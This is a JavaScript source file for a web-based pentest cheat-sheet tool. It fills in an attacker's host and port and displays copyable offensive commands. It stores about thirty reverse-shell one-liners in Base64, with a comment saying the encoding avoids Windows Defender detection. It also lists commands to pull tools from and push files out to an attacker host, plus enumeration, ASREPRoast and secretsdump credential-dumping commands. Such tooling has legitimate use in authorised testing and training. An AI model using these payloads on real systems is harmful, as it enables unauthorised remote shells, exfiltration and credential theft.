
$(function () {
  let STORAGE_KEY = null;
  let storageInfo = null;

  // --- Setup reverse shell list ---
  STORAGE_KEY = 'REVSHELL_ENV';
  storageInfo = JSON.parse(window.sessionStorage.getItem(STORAGE_KEY));
  const revshlhost = (storageInfo && storageInfo.LHOST) || '10.0.0.1';
  const revshlport = (storageInfo && storageInfo.LPORT) || '4444';
  const revShell = new RevShell('#mytoolRevShell', ['#revshListener', '#revshList'], {
    'LHOST': '#revshInputLHOST',
    'LPORT': '#revshInputLPORT',
    'SUBMIT': '#revshInputSubmit',
  });
  revShell.STORAGE_KEY = STORAGE_KEY;
  revShell.setup(revshlhost, revshlport);
  revShell.draw(revshlhost, revshlport);

  // --- Setup upload and download list ---
  STORAGE_KEY = 'UPDOWN_ENV';
  storageInfo = JSON.parse(window.sessionStorage.getItem(STORAGE_KEY));
  const updownlhost = (storageInfo && storageInfo.LHOST) || '10.0.0.1';
  const updownlport = (storageInfo && storageInfo.LPORT) || '4444';
  const updownfilename = (storageInfo && storageInfo.FILENAME) || 'linpeas.sh';
  const upDown = new UpDown('#mytoolUpDown', ['#updownUpList', '#updownDownList'], {
    'LHOST': '#updownInputLHOST',
    'LPORT': '#updownInputLPORT',
    'FILENAME': '#updownInputFILENAME',
    'SUBMIT': '#updownInputSubmit',
  })
  upDown.STORAGE_KEY = STORAGE_KEY;
  upDown.setup(updownlhost, updownlport, updownfilename);
  upDown.draw(updownlhost, updownlport, updownfilename);

  // --- Setup recon list ---
  STORAGE_KEY = 'RECON_ENV';
  storageInfo = JSON.parse(window.sessionStorage.getItem(STORAGE_KEY));
  const reconRhost = (storageInfo && storageInfo.RHOST) || '10.0.0.1';
  const reconLport = (storageInfo && storageInfo.RPORT) || '4444';
  const recon = new Recon('#mytoolRecon', ['#reconNmapList', '#reconLDAPList'], {
    'RHOST': '#reconInputRHOST',
    'RPORT': '#reconInputRPORT',
    'SUBMIT': '#reconInputSubmit',
  })
  recon.STORAGE_KEY = STORAGE_KEY;
  recon.setup(reconRhost, reconLport);
  recon.draw(reconRhost, reconLport);


  // URLのハッシュ(#以降の文字列)で初期表示ページの切り替え
  const myTabButton = document.querySelector(`#myTab button[data-bs-target="${location.hash}"]`);
  if (myTabButton) {
    $(myTabButton).trigger('click');
  }
  
});


// ---- My Tool ----------------------------------------------------------------
class MyTool {
  constructor(topCSSSelector, targetCSSSelectors, inputCSSSelectors) {
    this.topCSSSelector     = topCSSSelector;     // TOPのCSSセレクタ(ID)
    this.targetCSSSelectors = targetCSSSelectors; // リストのCSSセレクタの一覧
    this.inputCSSSelectors  = inputCSSSelectors;  // 入力フォームのCSSセレクタの一覧

    this.targetContents = {}; // コピー項目一覧
  }

  setup(...args) {
    // Set default value
    const inputCSSSelectorsKeys = Object.keys(this.inputCSSSelectors);
    for (let i = 0; i < args.length; i++) {
      const arg = args[i];
      const inputCSSSelectorKey = inputCSSSelectorsKeys[i];
      const inputCSSSelector = this.inputCSSSelectors[inputCSSSelectorKey];
      $(inputCSSSelector).val(arg);
    }

    // Set events
    for (let i = 0; i < inputCSSSelectorsKeys.length; i++) {
      const inputCSSSelectorKey = inputCSSSelectorsKeys[i];
      const inputCSSSelector = this.inputCSSSelectors[inputCSSSelectorKey];

      if (inputCSSSelectorKey === 'SUBMIT') { // Submitボタンのとき
        // Submit when click button
        $(inputCSSSelector).click(submit);
      } else { // 入力テキストのとき
        // Submit when press enter key.
        $(inputCSSSelector).keypress(function (e) {
          if (e.which === 13) { submit(); return false; }
        });
      }
    }

    self = this;
    function submit() {
      // 入力項目をinfoに格納する
      const info = {}
      for (let i = 0; i < args.length; i++) {
        const inputCSSSelectorKey = inputCSSSelectorsKeys[i];
        const inputCSSSelector = self.inputCSSSelectors[inputCSSSelectorKey];
        const value = $(inputCSSSelector).val().toString();

        info[inputCSSSelectorKey] = value;
      }

      // 入力項目に1つ以上空白があるか
      let isAnyEmpty = false;
      for (const key in info) {
        if (Object.hasOwnProperty.call(info, key)) {
          const element = info[key];
          if (element === undefined || element === "") {
            isAnyEmpty = true;
          }
        }
      }

      // 入力項目が全て入力されているとき
      if (!isAnyEmpty) {
        // Clear
        for (let i = 0; i < self.targetCSSSelectors.length; i++) {
          const targetCSSSelector = self.targetCSSSelectors[i];
          $(targetCSSSelector).empty();
        }
        // Create
        self.draw(...Object.values(info));
        // Set LHOST and LPORT info into session storage.
        window.sessionStorage.setItem(self.STORAGE_KEY, JSON.stringify(info));
      }
    }
  }

  draw(...args) {
    // 各リストの作成
    let index = -1;
    for (const key in this.targetContents) {
      index += 1;
      if (Object.hasOwnProperty.call(this.targetContents, key)) {
        const targetContent = this.targetContents[key];
        this.drawList(index, targetContent, ...args);
      }
    }
    // 各リストの要素がクリックでコピーできるようにイベントリスナを設定する
    this.setupCopyItem(this.topCSSSelector);
  }

  drawList(index, targetContent, ...args) {
    throw new Error("Not Implemented Error!");
  }

  setupCopyItem(CSSSelector) {
    // コピー可能な項目はクリック時にクリップボードにコピーする。
    $(`${CSSSelector} .copy_article`).each(function (index, element) {
      const $revsh = $(element);
      $revsh.mouseup(function () {
        // 文字列範囲選択中はClickを発火させない
        if (String(document.getSelection()).length !== 0) return false;
        // 枠内をクリックするとコピーボタンを押下する
        $revsh.find('.copy_input').trigger('click');
        return false;
      });
  
      // Copy Button
      const $copy_input = $revsh.find('.copy_input');
      $copy_input.click(function () {
        // 対象の文字列をinputに格納してからコピーする
        const text = $revsh.find('.copy_target').text();
        $('#input').val(text);
        var copyText = document.querySelector("#input");
        copyText.select();
        document.execCommand("copy");
        // コピー完了したらツールチップ表示
        $(this).tooltip('show');
        // コピー完了したら強調表示
        $('.my-active').removeClass('my-active');
        $revsh.addClass('my-active');
        return false;
      });
      //「Copy」ボタンのツールチップ（補足説明）の設定
      $copy_input.tooltip({trigger: 'manual'})
        .on('shown.bs.tooltip', function () { // tooltip表示後の動作を設定
          setTimeout((function () {
            $(this).tooltip('hide');
          }).bind(this), 1500);
        });
    });
  }
}

// ---- Reverse Shell ----------------------------------------------------------
class RevShell extends MyTool {
  constructor(...args) {
    super(...args);

    // 1. Listen
    this.targetContents['1.Listen'] = [
      {'title': '@Kali (netcat)', 'cmd': 'nc -lnvp {0}'},
    ]

    // 2. Connect back
    // ローカル開発時にWindows Definderに検知されないようにBase64で保存すること。
    // LHOST: {0}, LPORT: {1}
    this.targetContents['2.Connectback'] = [
      {'title': "Bash", 'base64': 'YmFzaCAtaSA+JiAvZGV2L3RjcC97MH0vezF9IDA+JjE='},
      {'title': "Bash", 'base64': 'MDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC97MH0vezF9OyBzaCA8JjE5NiA+JjE5NiAyPiYxOTY='},
      {'title': 'Bash (Base64)', 'base64': 'YmFzaCAtaSA+JiAvZGV2L3RjcC97MH0vezF9IDA+JjE=', 'cmd': 'echo {0} | base64 -d | bash'},
      {'title': 'Python', 'base64': 'cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiezB9Iix7MX0pKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOyc='},
      {'title': 'Python3', 'base64': 'cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoInswfSIsezF9KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTsn'},
      {'title': 'Perl', 'base64': 'cGVybCAtZSAndXNlIFNvY2tldDskaT0iezB9IjskcD17MX07c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe3tvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9fTsn'},
      {'title': 'Perl', 'base64': 'cGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApOyRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCJ7MH06ezF9Iik7U1RESU4tPmZkb3BlbigkYyxyKTskfi0+ZmRvcGVuKCRjLHcpO3N5c3RlbSRfIHdoaWxlPD47Jw=='},
      {'title': 'Perl (Windows)', 'base64': 'cGVybCAtTUlPIC1lICckYz1uZXcgSU86OlNvY2tldDo6SU5FVChQZWVyQWRkciwiezB9OnsxfSIpO1NURElOLT5mZG9wZW4oJGMscik7JH4tPmZkb3BlbigkYyx3KTtzeXN0ZW0kXyB3aGlsZTw+Oyc='},
      {'title': 'PowerShell', 'base64': 'cG93ZXJzaGVsbCAtTm9QIC1Ob25JIC1XIEhpZGRlbiAtRXhlYyBCeXBhc3MgLUNvbW1hbmQgTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCJ7MH0iLHsxfSk7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwlezB9O3doaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCl7ezskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI+JjEgfCBPdXQtU3RyaW5nICk7JHNlbmRiYWNrMiAgPSAkc2VuZGJhY2sgKyAiUFMgIiArIChwd2QpLlBhdGggKyAiPiAiOyRzZW5kYnl0ZSA9IChbdGV4dC5lbmNvZGluZ106OkFTQ0lJKS5HZXRCeXRlcygkc2VuZGJhY2syKTskc3RyZWFtLldyaXRlKCRzZW5kYnl0ZSwwLCRzZW5kYnl0ZS5MZW5ndGgpOyRzdHJlYW0uRmx1c2goKX19OyRjbGllbnQuQ2xvc2UoKQ=='},
      {'title': 'PowerShell', 'base64': 'cG93ZXJzaGVsbCAtbm9wIC1jICIkY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCd7MH0nLHsxfSk7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwlezB9O3doaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCl7ezskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI+JjEgfCBPdXQtU3RyaW5nICk7JHNlbmRiYWNrMiA9ICRzZW5kYmFjayArICdQUyAnICsgKHB3ZCkuUGF0aCArICc+ICc7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfX07JGNsaWVudC5DbG9zZSgpIg=='},
      {'title': 'PHP', 'base64': 'cGhwIC1yICckc29jaz1mc29ja29wZW4oInswfSIsezF9KTtleGVjKCIvYmluL3NoIC1pIDwmMyA+JjMgMj4mMyIpOyc='},
      {'title': 'PHP', 'base64': 'cGhwIC1yICckcz1mc29ja29wZW4oInswfSIsezF9KTtzaGVsbF9leGVjKCIvYmluL3NoIC1pIDwmMyA+JjMgMj4mMyIpOyc='},
      {'title': 'PHP', 'base64': 'cGhwIC1yICckcz1mc29ja29wZW4oInswfSIsezF9KTtgL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjNgOyc='},
      {'title': 'PHP', 'base64': 'cGhwIC1yICckcz1mc29ja29wZW4oInswfSIsezF9KTtzeXN0ZW0oIi9iaW4vc2ggLWkgPCYzID4mMyAyPiYzIik7Jw=='},
      {'title': 'PHP', 'base64': 'cGhwIC1yICckcz1mc29ja29wZW4oInswfSIsezF9KTtwb3BlbigiL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMiLCAiciIpOyc='},
      {'title': 'PHP', 'base64': 'cGhwIC1yICckc29jaz1mc29ja29wZW4oInswfSIsezF9KTsgJHByb2MgPSBwcm9jX29wZW4oIi9iaW4vc2ggLWkiLCBhcnJheSgwPT4kc29jaywgMT0+JHNvY2ssIDI9PiRzb2NrKSwgJHBpcGVzKTsn'},
      {'title': 'Node.js', 'base64': 'KGZ1bmN0aW9uKCl7e3ZhciBuZXQ9cmVxdWlyZSgibmV0IiksY3A9cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLHNoPWNwLnNwYXduKCIvYmluL3NoIixbXSk7dmFyIGNsaWVudD1uZXcgbmV0LlNvY2tldCgpO2NsaWVudC5jb25uZWN0KHsxfSwiezB9IixmdW5jdGlvbigpe3tjbGllbnQucGlwZShzaC5zdGRpbik7c2guc3Rkb3V0LnBpcGUoY2xpZW50KTtzaC5zdGRlcnIucGlwZShjbGllbnQpO319KTtyZXR1cm4gL2EvO319KSgpOw=='},
      {'title': 'Ruby', 'base64': 'cnVieSAtcnNvY2tldCAtZSdmPVRDUFNvY2tldC5vcGVuKCJ7MH0iLHsxfSkudG9faTtleGVjIHNwcmludGYoIi9iaW4vc2ggLWkgPCYlZCA+JiVkIDI+JiVkIixmLGYsZikn'},
      {'title': 'Ruby', 'base64': 'cnVieSAtcnNvY2tldCAtZSAnZXhpdCBpZiBmb3JrO2M9VENQU29ja2V0Lm5ldygiezB9IiwiezF9Iik7d2hpbGUoY21kPWMuZ2V0cyk7SU8ucG9wZW4oY21kLCJyIil7e3xpb3xjLnByaW50IGlvLnJlYWR9fWVuZCc='},
      {'title': 'Ruby (Windows)', 'base64': 'cnVieSAtcnNvY2tldCAtZSAnYz1UQ1BTb2NrZXQubmV3KCJ7MH0iLCJ7MX0iKTt3aGlsZShjbWQ9Yy5nZXRzKTtJTy5wb3BlbihjbWQsInIiKXt7fGlvfGMucHJpbnQgaW8ucmVhZH19ZW5kJw=='},
      {'title': 'Golang', 'base64': 'ZWNobyAncGFja2FnZSBtYWluO2ltcG9ydCJvcy9leGVjIjtpbXBvcnQibmV0IjtmdW5jIG1haW4oKXt7YyxfOj1uZXQuRGlhbCgidGNwIiwiezB9OnsxfSIpO2NtZDo9ZXhlYy5Db21tYW5kKCIvYmluL3NoIik7Y21kLlN0ZGluPWM7Y21kLlN0ZG91dD1jO2NtZC5TdGRlcnI9YztjbWQuUnVuKCl9fScgPiAvdG1wL3QuZ28gJiYgZ28gcnVuIC90bXAvdC5nbyAmJiBybSAvdG1wL3QuZ28='},
      {'title': 'netcat', 'base64': 'bmMgLWUgL2Jpbi9zaCB7MH0gezF9'},
      {'title': 'netcat', 'base64': 'bmMgLWUgL2Jpbi9iYXNoIHswfSB7MX0='},
      {'title': 'netcat', 'base64': 'bmMgLWMgYmFzaCB7MH0gezF9'},
      {'title': 'netcat (OpenBSD)', 'base64': 'cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgezB9IHsxfSA+L3RtcC9m'},
      {'title': 'ncat', 'base64': 'bmNhdCB7MH0gezF9IC1lIC9iaW4vYmFzaA=='},
      {'title': 'ncat', 'base64': 'bmNhdCAtLXVkcCB7MH0gezF9IC1lIC9iaW4vYmFzaA=='},
      {'title': 'AWK', 'base64': 'YXdrICdCRUdJTiB7e3MgPSAiL2luZXQvdGNwLzAvezB9L3sxfSI7IHdoaWxlKDQyKSB7eyBkb3t7IHByaW50ZiAic2hlbGw+IiB8JiBzOyBzIHwmIGdldGxpbmUgYzsgaWYoYyl7eyB3aGlsZSAoKGMgfCYgZ2V0bGluZSkgPiAwKSBwcmludCAkMCB8JiBzOyBjbG9zZShjKTsgfX0gfX0gd2hpbGUoYyAhPSAiZXhpdCIpIGNsb3NlKHMpOyB9fX19JyAvZGV2L251bGw='},
      {'title': 'lua (Linux)', 'base64': 'bHVhIC1lICJyZXF1aXJlKCdzb2NrZXQnKTtyZXF1aXJlKCdvcycpO3Q9c29ja2V0LnRjcCgpO3Q6Y29ubmVjdCgnezB9JywnezF9Jyk7b3MuZXhlY3V0ZSgnL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMnKTsi'},
      {'title': 'lua', 'base64': 'bHVhNS4xIC1lICdsb2NhbCBob3N0LCBwb3J0ID0gInswfSIsIHsxfSBsb2NhbCBzb2NrZXQgPSByZXF1aXJlKCJzb2NrZXQiKSBsb2NhbCB0Y3AgPSBzb2NrZXQudGNwKCkgbG9jYWwgaW8gPSByZXF1aXJlKCJpbyIpIHRjcDpjb25uZWN0KGhvc3QsIHBvcnQpOyB3aGlsZSB0cnVlIGRvIGxvY2FsIGNtZCwgc3RhdHVzLCBwYXJ0aWFsID0gdGNwOnJlY2VpdmUoKSBsb2NhbCBmID0gaW8ucG9wZW4oY21kLCAiciIpIGxvY2FsIHMgPSBmOnJlYWQoIiphIikgZjpjbG9zZSgpIHRjcDpzZW5kKHMpIGlmIHN0YXR1cyA9PSAiY2xvc2VkIiB0aGVuIGJyZWFrIGVuZCBlbmQgdGNwOmNsb3NlKCkn'},
      {'title': 'Java', 'base64': 'ciA9IFJ1bnRpbWUuZ2V0UnVudGltZSgpO3AgPSByLmV4ZWMoWyIvYmluL3NoIiwiLWMiLCJleGVjIDU8Pi9kZXYvdGNwL3swfS97MX07Y2F0IDwmNSB8IHdoaWxlIHJlYWQgbGluZTsgZG8gXCRsaW5lIDI+JjUgPiY1OyBkb25lIl0gYXMgU3RyaW5nW10pO3Aud2FpdEZvcigpOw=='},
      {'title': 'socat', 'base64': 'c29jYXQgZXhlYzonYmFzaCAtbGknLHB0eSxzdGRlcnIsc2V0c2lkLHNpZ2ludCxzYW5lIHRjcDp7MH06ezF9'},
      {'title': 'socat (Windows)', 'base64': 'c29jYXQuZXhlIC1kIC1kIFRDUDQ6ezB9OnsxfSBFWEVDOidjbWQuZXhlJyxwaXBlcw=='},
      {'title': 'telnet', 'base64': 'cm0gLWYgL3RtcC9wOyBta25vZCAvdG1wL3AgcCAmJiB0ZWxuZXQgezB9IHsxfSAwL3RtcC9w'},
    ]
  }

  drawList(index, targetContent, lhost, lport) {
    for (let i = 0; i < targetContent.length; i++) {
      const content = targetContent[i];
      let title = content.title;
      let cmd = "";

      if (content.base64 && content.cmd) {
        // base64デコードしてcmdに埋め込む
        let shell = atob(content.base64);
        shell = shell.replace('{0}', htmlEscape(lhost));
        shell = shell.replace('{1}', htmlEscape(lport));
        cmd = content.cmd.replace('{0}', btoa(shell));
      } else if (content.base64) {
        // base64デコードする
        cmd = atob(content.base64);
        cmd = cmd.replace('{0}', `<span class="bg-warning">${htmlEscape(lhost)}</span>`);
        cmd = cmd.replace('{1}', `<span class="bg-warning">${htmlEscape(lport)}</span>`);
      } else {
        // コマンドそのまま
        cmd = content.cmd;
        cmd = cmd.replace('{0}', `<span class="bg-warning">${htmlEscape(lhost)}</span>`);
        cmd = cmd.replace('{1}', `<span class="bg-warning">${htmlEscape(lport)}</span>`);
      }

      // Template
      $(this.targetCSSSelectors[index]).append(`
      <li class="list-group-item d-flex justify-content-between align-items-start copy_article">
        <div class="ms-2 me-auto" style="width: 80%">
          <div class="fw-bold">${title}</div>
          <code class="copy_target">${cmd}</code>
        </div>
        <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">Copy</button>
      </li>
      `);
    }
  }
}

// --- Upload and Download -----------------------------------------------------
class UpDown extends MyTool {
  constructor(...args) {
    super(...args);

    // LHOST: {0}, LPORT: {1}, FILE: {2}
    this.targetContents[0] = [
      {'title': '1. @Kali (bash)', 'cmd': 'nc -lnvp {1} < {2}'},
      {'title': '1. cat', 'cmd': 'cat < /dev/tcp/{0}/{1} > {2}'},
      {'title': '2. @Kali (curl, wget)', 'cmd': 'python3 -m http.server {1}'},
      {'title': '2. wget', 'cmd': 'wget {0}:{1}/{2}'},
      {'title': '2. curl', 'cmd': 'curl {0}:{1}/{2} -O'},
      {'title': '2. powershell', 'cmd': `powershell -exec bypass -command "(New-Object System.Net.WebClient).DownloadFile('http://{0}:{1}/{2}', '{2}')"`},
      {'title': '2.A. Create wget.vbs', 'cmd': `echo strUrl = WScript.Arguments.Item(0) > wget.vbs; echo StrFile = WScript.Arguments.Item(1) >> wget.vbs; echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs; echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs; echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs; echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs; echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs; echo Err.Clear >> wget.vbs; echo Set http = Nothing >> wget.vbs; echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs; echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs; echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs; echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs; echo http.Open "GET", strURL, False >> wget.vbs; echo http.Send >> wget.vbs; echo varByteArray = http.ResponseBody >> wget.vbs; echo Set http = Nothing >> wget.vbs; echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs; echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs; echo strData = "" >> wget.vbs; echo strBuffer = "" >> wget.vbs; echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs; echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs; echo Next >> wget.vbs; echo ts.Close >> wget.vbs`},
      {'title': '2.B. cscript', 'cmd': 'cscript wget.vbs http://{0}:{1}/{2} {2}'},
    ];

    // LHOST: {0}, LPORT: {1}, FILE: {2}
    this.targetContents[1] = [
      {'title': '1. @Kali (bash)', 'cmd': 'nc -lvnp {1} > {2}'},
      {'title': '1. bash', 'cmd': 'cat {2} > /dev/tcp/{0}/{1}'},
      {'title': '2. @Kali (curl)', 'cmd': 'wget https://gist.githubusercontent.com/touilleMan/eb02ea40b93e52604938/raw/b5b9858a7210694c8a66ca78cfed0b9f6f8b0ce3/SimpleHTTPServerWithUpload.py'},
      {'title': '2. @Kali (curl)', 'cmd': 'python3 SimpleHTTPServerWithUpload.py'},
      {'title': '2. curl', 'cmd': 'curl {0}:{1} -X POST -F file=@{2}'},
      {'title': '3. @Kali (powershell)', 'cmd': 'python3 SimpleHTTPServerWithUpload.py'},
      {'title': '3. powershell', 'cmd': `powershell -exec bypass -command "(New-Object System.Net.WebClient).UploadFile('http://{0}:{1}','{2}')"`},
    ];
  }

  drawList(index, targetContent, lhost, lport, filename) {
    for (let i = 0; i < targetContent.length; i++) {
      const uploadCmd = targetContent[i];
      let title = uploadCmd.title;
      let cmd = uploadCmd.cmd;
      cmd = cmd.replace('{0}', `<span class="bg-warning">${htmlEscape(lhost)}</span>`);
      cmd = cmd.replace('{1}', `<span class="bg-warning">${htmlEscape(lport)}</span>`);
      cmd = cmd.replaceAll('{2}', `<span class="bg-warning">${htmlEscape(filename)}</span>`);
      // Template
      $(this.targetCSSSelectors[index]).append(`
      <li class="list-group-item d-flex justify-content-between align-items-start copy_article">
        <div class="ms-2 me-auto" style="width: 80%">
          <div class="fw-bold">${title}</div>
          <code class="copy_target">${cmd}</code>
        </div>
        <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">Copy</button>
      </li>
      `);
    }
  }
}

// ---- Reconnaissance ----------------------------------------------------------
class Recon extends MyTool {
  constructor(...args) {
    super(...args);

    this.targetContents['1.nmap'] = [
      {'title': 'nmap', 'cmd': 'nmap -T4 -A -v {0}'},
      {'title': 'nmap', 'cmd': 'nmap -sC -sV -O -n -o nmapscan.txt {0}'},
      {'title': 'nmap', 'cmd': 'nmap -sC -sV -p{1} "{0}" -o nmapscan.txt'},
    ];

    this.targetContents['LDAP'] = [
      {'title': 'nmap', 'cmd': 'nmap --script=ldap-search {0}'},
      {'title': 'enum4linux', 'cmd': 'enum4linux {0}'},
      {'title': 'enum4linux (extracting users)', 'cmd': `enum4linux {0} | grep -E '^user:' | cut -d "[" -f 2 | cut -d "]" -f 1 > users.txt`},
      {'title': 'impacket (ASREPRoast Attack)', 'cmd': 'python3 GetNPUsers.py $DOMAIN/ -usersfile "users.txt" -format john -outputfile "GetNPUsers.result"'},
      {'title': 'impacket secretsdump', 'cmd': 'python3 secretsdump.py $DOMAIN/$USERNAME:$PASSWORD@{0}'},
    ]
  }

  drawList(index, targetContent, rhost, rport) {
    for (let i = 0; i < targetContent.length; i++) {
      const uploadCmd = targetContent[i];
      let title = uploadCmd.title;
      let cmd = uploadCmd.cmd;
      cmd = cmd.replace('{0}', `<span class="bg-warning">${htmlEscape(rhost)}</span>`);
      cmd = cmd.replace('{1}', `<span class="bg-warning">${htmlEscape(rport)}</span>`);
      // Template
      $(this.targetCSSSelectors[index]).append(`
      <li class="list-group-item d-flex justify-content-between align-items-start copy_article">
        <div class="ms-2 me-auto" style="width: 80%">
          <div class="fw-bold">${title}</div>
          <code class="copy_target">${cmd}</code>
        </div>
        <button type="button" class="btn btn-outline-primary copy_input" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy to clipboard">Copy</button>
      </li>
      `);
    }
  }
}


function htmlEscape(str) {
  if (!str) return;
  return str.replace(/[<>&"'`]/g, function (match) {
    const escape = {
      '<': '&lt;',
      '>': '&gt;',
      '&': '&amp;',
      '"': '&quot;',
      "'": '&#39;',
      '`': '&#x60;'
    };
    return escape[match];
  });
}
